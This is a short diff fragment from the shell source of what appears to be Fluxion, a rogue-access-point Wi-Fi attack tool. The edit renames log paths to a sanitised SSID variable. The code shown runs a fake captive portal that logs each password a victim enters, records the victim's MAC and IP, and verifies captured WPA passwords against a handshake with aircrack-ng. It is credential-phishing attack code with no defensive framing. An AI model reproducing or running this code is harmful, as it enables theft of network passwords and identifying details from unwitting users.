@@ -641,7 +641,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 		fi
 
 		# Save any new password attempt.
-		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$APTargetSSID-$APTargetMAC.log\"
+		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$APTargetSSIDClean-$APTargetMAC.log\"
 
 		# Clear logged password attempt.
 		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
@@ -739,11 +739,11 @@ Time: \$ih\$h:\$im\$m:\$is\$s
 Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
 Mac: $(captive_portal_get_IP_MAC)
 IP: $(captive_portal_get_client_IP)
-\" >\"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+\" >\"$CaptivePortalNetLog/$APTargetSSIDClean-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
 	if [ $APRogueAuthMode = "hash" ]; then
 		echo "
-aircrack-ng -a 2 -b $APTargetMAC -0 -s \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log"$CClr"\"\
+aircrack-ng -a 2 -b $APTargetMAC -0 -s \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSIDClean-$APTargetMAC.log"$CClr"\"\
 " >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 	fi
 
